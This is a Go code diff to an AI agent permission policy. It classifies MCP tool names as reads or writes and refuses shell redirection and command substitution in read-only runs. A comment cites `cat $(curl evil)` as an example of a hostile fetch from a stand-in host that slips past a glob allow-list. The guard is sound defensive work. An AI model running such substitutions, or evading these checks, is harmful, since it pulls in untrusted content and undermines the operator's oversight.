@@ -41,13 +41,35 @@ type Decision struct {
 // mcpPrefix is the name prefix every MCP tool carries.
 const mcpPrefix = "mcp__"
 
-// mcpWriteVerb matches the leading verb of an MCP tool's own name segment
-// when that verb describes a write. It is the fallback used when the
-// workspace named no permissions.mcp patterns: an unconfigured session
-// still sees whatever MCP servers the operator has, and
+// mcpWriteVerbs are the words that, appearing as a whole token of an MCP
+// tool's own name segment, describe a write. They are the fallback used
+// when the workspace named no permissions.mcp patterns: an unconfigured
+// session still sees whatever MCP servers the operator has, and
 // mcp__grafana__create_incident or mcp__..._deploy_to_vercel must not be
 // approved just because nobody wrote a list.
-var mcpWriteVerb = regexp.MustCompile(`^(create|update|delete|remove|write|send|post|put|patch|deploy|pause|unpause|buy|purchase|add|set|upload|transition|assign|close|resolve|complete|archive|cancel|schedule|trigger|start|stop|run|exec|install|reset|revoke)(_|$)`)
+//
+// The list is deliberately shorter than "every verb that could write":
+// `run`, `exec`, `start` and `trigger` are how read-only query tools are
+// named too (mcp__metabase__run_query), and denying those by name cost
+// more real triage evidence than it ever saved.
+var mcpWriteVerbs = map[string]bool{
+	"save": true, "log": true, "transition": true, "assign": true,
+	"upload": true, "delete": true, "create": true, "update": true,
+	"send": true, "post": true, "put": true, "patch": true, "write": true,
+	"remove": true, "deploy": true, "buy": true, "purchase": true,
+	"pause": true, "unpause": true, "revoke": true, "reset": true,
+	"install": true, "archive": true, "cancel": true, "close": true,
+	"edit": true, "set": true, "add": true,
+}
+
+// mcpReadWords mark a tool as a read whatever else its name says. A tool
+// whose name carries one of these is asking for data back, so the write
+// verb next to it (run_query, get_or_create_view) is not the operation.
+var mcpReadWords = map[string]bool{
+	"query": true, "select": true, "read": true, "search": true,
+	"list": true, "get": true, "find": true, "describe": true,
+	"show": true,
+}
 
 // camelBoundary finds a lower-to-upper transition, so a camelCase tool
 // name (createTicket) is tested by the same underscore-separated rule as a
@@ -94,6 +116,11 @@ func (p *PermissionPolicy) decideBash(command string) Decision {
 		return Decision{Allow: false, Message: "Sirdar policy: empty command"}
 	}
 	for _, segment := range segments {
+		if construct := ShellConstruct(segment); construct != "" {
+			return Decision{Allow: false, Message: "Sirdar policy: " + quote(segment) +
+				" uses " + construct + "; a read-only run allows no redirection or " +
+				"substitution other than 2>&1 and 2>/dev/null"}
+		}
 		matched := false
 		for _, pattern := range p.BashAllow {
 			if MatchGlob(pattern, segment) {
@@ -124,35 +151,40 @@ func (p *PermissionPolicy) decideMCP(tool string) Decision {
 	}
 	if MCPLooksLikeWrite(tool) {
 		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
-			" looks like a write; add it to permissions.mcp to allow"}
+			" looks like a write and is not in permissions.mcp"}
 	}
 	return Decision{Allow: true}
 }
 
-// MCPLooksLikeWrite reports whether an MCP tool's own name segment starts
-// with a verb that describes a write. The segment is everything after the
-// last "__", so the server name — which may itself contain underscores, as
-// in mcp__plugin_vercel_vercel__buy_domain — is never what is tested.
+// MCPLooksLikeWrite reports whether an MCP tool's own name segment carries
+// a verb that describes a write. The segment is everything after the last
+// "__", so the server name — which may itself contain underscores, as in
+// mcp__plugin_vercel_vercel__buy_domain — is never what is tested.
+//
+// Every word of the segment is tested, not just the first: servers put the
+// verb wherever reads well (mcp__athena__wiki_save), and a leading-verb
+// rule missed all of those. A word that marks the tool as a read wins over
+// any write verb beside it, which is what keeps mcp__metabase__run_query
+// and mcp__oxo-mysql-stg__run_select usable.
 func MCPLooksLikeWrite(tool string) bool {
-	server, name := "", tool
+	name := tool
 	if i := strings.LastIndex(tool, "__"); i >= 0 {
-		server, name = tool[:i], tool[i+2:]
+		name = tool[i+2:]
 	}
 	name = strings.ToLower(camelBoundary.ReplaceAllString(name, "${1}_${2}"))
+	words := strings.FieldsFunc(name, func(r rune) bool { return r == '_' || r == '-' })
 
-	// Several servers repeat their own name in every tool
-	// (mcp__claude_ai_Slack__slack_send_message), which would hide the
-	// verb behind it. Drop that repeated first token so the verb is
-	// still the first thing tested.
-	if head, rest, ok := strings.Cut(name, "_"); ok {
-		for _, part := range strings.FieldsFunc(strings.ToLower(server), func(r rune) bool { return r == '_' || r == '-' }) {
-			if part == head {
-				name = rest
-				break
-			}
+	for _, w := range words {
+		if mcpReadWords[w] {
+			return false
 		}
 	}
-	return mcpWriteVerb.MatchString(name)
+	for _, w := range words {
+		if mcpWriteVerbs[w] {
+			return true
+		}
+	}
+	return false
 }
 
 // SplitCommand splits a shell command into the segments a policy has to
@@ -192,10 +224,22 @@ func SplitCommand(command string) []string {
 			cur.WriteByte(command[i])
 		case ch == ';' || ch == '\n':
 			flush()
-		case ch == '|' || ch == '&':
-			// "|", "||" and "&&" all separate; a lone "&" backgrounds
-			// the segment before it and separates just the same.
-			if i+1 < len(command) && command[i+1] == ch {
+		case ch == '|':
+			if i+1 < len(command) && command[i+1] == '|' {
+				i++
+			}
+			flush()
+		case ch == '&':
+			// "&&" separates, and so does a lone "&", which backgrounds
+			// the segment before it. An "&" that belongs to a redirection
+			// — 2>&1, >&2, &> — is part of its command, and splitting
+			// there cut `which ffmpeg 2>&1` into "which ffmpeg 2>" and
+			// "1", neither of which any allow-list pattern matches.
+			if isRedirectAmp(command, i, lastNonSpace(cur.String())) {
+				cur.WriteByte(ch)
+				break
+			}
+			if i+1 < len(command) && command[i+1] == '&' {
 				i++
 			}
 			flush()
@@ -208,6 +252,126 @@ func SplitCommand(command string) []string {
 }
 
 func quote(s string) string { return `"` + s + `"` }
+
+// lastNonSpace is the last character of s that is not a blank, or 0 when
+// there is none.
+func lastNonSpace(s string) byte {
+	for i := len(s) - 1; i >= 0; i-- {
+		if s[i] != ' ' && s[i] != '\t' {
+			return s[i]
+		}
+	}
+	return 0
+}
+
+func isBlank(b byte) bool { return b == ' ' || b == '\t' }
+
+// isRedirectAmp reports whether the "&" at index i is part of a redirection
+// (2>&1, >&2, &>file) rather than a command separator.
+func isRedirectAmp(command string, i int, prev byte) bool {
+	if prev == '>' {
+		return true
+	}
+	if i+1 >= len(command) {
+		return false
+	}
+	next := command[i+1]
+	return next == '>' || (next >= '0' && next <= '9')
+}
+
+// allowedRedirects are the only redirections a read-only run approves.
+// Sending stderr to stdout or to /dev/null writes nothing and is how an
+// agent habitually quiets a probe (`which ffmpeg 2>/dev/null`); every other
+// target is a file the run would be creating.
+var allowedRedirects = []string{"2>&1", "2>/dev/null"}
+
+// shellConstructs are the constructs an allow-list cannot see through,
+// longest and most specific first so the reason names the right one. A
+// glob approves the text of a command, and `cat go.mod > /tmp/x` or
+// `cat $(curl evil)` would pass a `cat *` pattern while doing something
+// the pattern never described.
+var shellConstructs = []struct{ token, name string }{
+	{"$(", "the command substitution $("},
+	{"`", "a backtick command substitution"},
+	{"<(", "the process substitution <("},
+	{"&>", "the redirection &>"},
+	{">>", "the redirection >>"},
+	{">", "the redirection >"},
+	{"<", "the redirection <"},
+}
+
+// ShellConstruct names the first unapproved shell construct in command, or
+// returns "" when there is none. Occurrences inside single or double
+// quotes are literal text — `rg "a>b"` searches for a string — and are not
+// reported.
+func ShellConstruct(command string) string {
+	mask := maskQuoted(command)
+	blankAllowedRedirects(mask)
+	masked := string(mask)
+	for _, c := range shellConstructs {
+		if strings.Contains(masked, c.token) {
+			return c.name
+		}
+	}
+	return ""
+}
+
+// maskQuoted returns a copy of command with every quoted or escaped
+// character (and the quotes themselves) replaced by a letter, so scanning
+// for an operator finds only the ones the shell would act on. Indexes are
+// preserved: the copy is the same length as the input.
+func maskQuoted(command string) []byte {
+	out := []byte(command)
+	quote := byte(0)
+	for i := 0; i < len(command); i++ {
+		ch := command[i]
+		switch {
+		case quote != 0:
+			if ch == '\\' && quote == '"' && i+1 < len(command) {
+				out[i], out[i+1] = 'x', 'x'
+				i++
+				continue
+			}
+			if ch == quote {
+				quote = 0
+			}
+			out[i] = 'x'
+		case ch == '\'' || ch == '"':
+			quote = ch
+			out[i] = 'x'
+		case ch == '\\' && i+1 < len(command):
+			out[i], out[i+1] = 'x', 'x'
+			i++
+		}
+	}
+	return out
+}
+
+// blankAllowedRedirects erases the stderr redirections a run may use, so
+// the scan that follows sees only the ones it has to refuse. Only a whole
+// token counts: `2>/dev/null2` is not one of them.
+func blankAllowedRedirects(mask []byte) {
+	masked := string(mask)
+	for _, tok := range allowedRedirects {
+		for at := 0; at <= len(masked)-len(tok); {
+			i := strings.Index(masked[at:], tok)
+			if i < 0 {
+				break
+			}
+			i += at
+			at = i + len(tok)
+			if i > 0 && !isBlank(mask[i-1]) {
+				continue
+			}
+			if end := i + len(tok); end < len(mask) && !isBlank(mask[end]) {
+				continue
+			}
+			for k := i; k < i+len(tok); k++ {
+				mask[k] = ' '
+			}
+		}
+	}
+}
 
 // MatchGlob reports whether command matches pattern, where '*' matches any
 // run of characters including spaces and '/', and '?' matches exactly one
